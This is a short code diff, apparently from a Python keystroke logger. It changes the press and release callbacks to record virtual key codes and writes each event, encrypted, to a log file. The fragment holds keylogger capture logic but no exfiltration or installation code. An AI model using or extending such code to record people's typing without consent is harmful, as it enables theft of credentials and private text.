@@ -10,7 +10,7 @@ def on_press(key, log_file, key_obj):
     Callback function to handle key press events.
     """
     try:
-        data = f"Key pressed: {key.char}"
+        data = f"Key pressed: {key.vk}"
     except AttributeError:
         data = f"Special key pressed: {key}"
 
@@ -22,7 +22,12 @@ def on_release(key, log_file, key_obj):
     """
     Callback function to handle key release events.
     """
-    data = f"Key released: {key}"
+    try:
+        key_code = key.vk
+    except AttributeError:
+        key_code = str(key)
+
+    data = f"Key released: {key_code}"
     encrypted_data = encrypt_data(data, key_obj)
     with open(log_file, "ab") as file:
         file.write(encrypted_data + b'\n')
